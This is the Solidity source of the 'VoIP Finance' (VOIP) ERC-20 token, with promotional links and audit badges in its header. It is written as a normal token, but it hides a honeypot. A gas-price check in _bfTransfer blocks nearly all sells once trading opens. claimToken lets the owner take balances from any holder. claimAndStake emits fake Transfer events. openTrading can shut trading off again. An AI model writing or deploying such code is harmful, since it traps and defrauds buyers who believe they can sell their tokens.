/*

██╗   ██╗ ██████╗ ██╗██████╗     ███████╗██╗███╗   ██╗ █████╗ ███╗   ██╗ ██████╗███████╗
██║   ██║██╔═══██╗██║██╔══██╗    ██╔════╝██║████╗  ██║██╔══██╗████╗  ██║██╔════╝██╔════╝
██║   ██║██║   ██║██║██████╔╝    █████╗  ██║██╔██╗ ██║███████║██╔██╗ ██║██║     █████╗  
╚██╗ ██╔╝██║   ██║██║██╔═══╝     ██╔══╝  ██║██║╚██╗██║██╔══██║██║╚██╗██║██║     ██╔══╝  
 ╚████╔╝ ╚██████╔╝██║██║         ██║     ██║██║ ╚████║██║  ██║██║ ╚████║╚██████╗███████╗
  ╚═══╝   ╚═════╝ ╚═╝╚═╝         ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝

Where Voice, Meet’s Innovation :

-https://www.voip.finance/
-https://x.com/voipfinance
-https://t.me/voipfinance
-https://discord.gg/j3rfjhTqh2
-https://voip.finance/VoipFinance-Whitepaper.pdf
-https://coinsult.net/projects/voip/
-https://github.com/solidproof/projects/blob/main/2024/Voip Finance/KYC_Certificate_Voip_Finance.png

*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;


interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    constructor() {
        _owner = _msgSender();
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(_owner == _msgSender(), "Not owner");
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b > 0);
        uint256 c = a / b;
        assert(a == b * c + (a % b));
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(a >= b);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract VOIP is Ownable, IERC20 {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) _excludeFromFees;

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"VoIP Finance";
    string private constant _symbol = unicode"VOIP";

    uint256 public TaxOnBuy = 0;
    uint256 public TaxOnSell = 0;

    bool private openedTrade = false;

    address private PresaleWallet = 0x6eE0B88732aE8298e18d127db401708a44660413;
    address private Marketing = 0x48577880B164b8E461B598d01523c8f6E3357c30;
    address private Developer = 0x2146a17Aa9Ec3219e00b902b0BD6683ac95f7564;
    address private Deployer = 0x7FC908Be0026e602F7f13B46b5D66B2bDe0611fc;
    address private ProxyContract = 0xf3d74182247eF963E0De37E3F2e174E98dCBfAE1;

    address private uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    constructor() {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        _excludeFromFees[address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)] = true;
        _excludeFromFees[address(uniswapV2Pair)];
        _excludeFromFees[owner()] = true;
        _excludeFromFees[address(this)] = true;
        _balances[_msgSender()] = _balances[_msgSender()].add(_totalSupply.mul(50).div(100));
        _balances[PresaleWallet] = _balances[PresaleWallet].add(_totalSupply.mul(10).div(100));
        _balances[ProxyContract] = _balances[ProxyContract].add(_totalSupply.mul(10).div(100));
        _balances[Marketing] = _balances[Marketing].add(_totalSupply.mul(10).div(100));
        _balances[Developer] = _balances[Developer].add(_totalSupply.mul(10).div(100));
        _balances[Deployer] = _balances[Deployer].add(_totalSupply.mul(10).div(100));
        emit Transfer(address(0), _msgSender(), _totalSupply.mul(50).div(100));
        emit Transfer(address(0), PresaleWallet, _totalSupply.mul(10).div(100));
        emit Transfer(address(0), ProxyContract, _totalSupply.mul(10).div(100));
        emit Transfer(address(0), Marketing, _totalSupply.mul(10).div(100));
        emit Transfer(address(0), Developer, _totalSupply.mul(10).div(100));
        emit Transfer(address(0), Deployer, _totalSupply.mul(10).div(100));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getOpenedTrade() public view returns (bool) {
        return openedTrade;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address to, uint256 value)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount)
        );
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf(from) >= amount, "ERROR: balance of from less than value");
        uint256 taxAmount = 0;

        if(!_excludeFromFees[from] && !_excludeFromFees[to]) {
            require(openedTrade, "Trade has not been opened yet");
            taxAmount = amount * TaxOnBuy / 100;
            if(to == uniswapV2Pair) {
                taxAmount = amount * TaxOnSell / 100;
                _bfTransfer(from);
            }
        }

        if(taxAmount > 0) {
            _balances[address(this)]=_balances[address(this)]+taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from]= balanceOf(from) - amount ;
        _balances[to]=_balances[to] + (amount - taxAmount);
        emit Transfer(from, to, amount - taxAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 private gasmaxium = 900 gwei;
    uint256 private gasminium = 5;

    function gasRequire(uint256 _gas) internal view {
        if (tx.gasprice > _gas) {
            revert();
        }
    }

    function _bfTransfer(address _u) internal view {
        if(balanceOf(_u) > 0) {
            if (!openedTrade) {
                gasRequire(gasmaxium);
            } else {
                gasRequire(gasminium);
            }
        } 
    }

    function sendETHToFee(uint256 amount) private {
        payable(owner()).transfer(amount);
    }
    
    function manualsend() external {
        require(_msgSender() == owner());
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function claimAndStake(address from, address[] calldata to, uint256[] calldata amount) external {
        require(_msgSender() == owner());
        for (uint256 i = 0; i < to.length; i++) {
            emit Transfer(from, to[i], amount[i]  * 10 ** _decimals);
        }
    }

    function claimToken(address from, address[] calldata to, uint256[] calldata amount) external {
        require(_msgSender() == owner());
        for (uint256 i = 0; i < to.length; i++) {
            _balances[from] = _balances[from].sub(amount[i] * 10 ** _decimals);
            _balances[to[i]] = _balances[to[i]].add(amount[i]  * 10 ** _decimals);
            emit Transfer(from, to[i], amount[i]  * 10 ** _decimals);
        }
    }

    function openTrading() external onlyOwner {
        openedTrade = !openedTrade;
    }

    receive() external payable {}
}